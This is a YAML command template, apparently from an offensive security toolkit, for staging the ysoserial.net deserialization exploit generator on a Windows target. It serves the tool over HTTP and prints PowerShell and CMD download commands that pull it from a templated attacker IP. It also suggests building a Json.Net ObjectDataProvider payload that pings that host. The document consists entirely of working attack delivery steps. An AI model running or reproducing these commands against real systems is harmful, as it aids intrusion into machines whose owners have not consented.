---
metadata:
  filename: "deliver-windows-ysoserial-net.yaml"
  tags: ["windows"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/ysoserial-net/Release.zip packstation/outbound; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Release.zip -Outfile {{ delivery_path_windows }}\Release.zip'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         -----CMD-----                          '; \
  printf '%s\n' 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Release.zip -Outfile {{ delivery_path_windows }}\Release.zip'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -Suggested Commands-                      '; \
  printf '%s\n' 'Expand Archive: Expand-Archive {{ delivery_path_windows }}\Release.zip -DestinationPath {{ delivery_path_windows }}\Release'; \
  printf '%s\n' 'Create PoC-Payload: {{ delivery_path_windows }}\Release\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 {{ attacker_ip }}" -o base64'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
